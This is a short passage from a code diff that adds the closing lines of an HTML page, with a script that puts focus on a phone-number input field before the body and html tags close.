+            document.getElementById('phoneNumber').focus();
+        });
+    </script>
+</body>
+  </html>
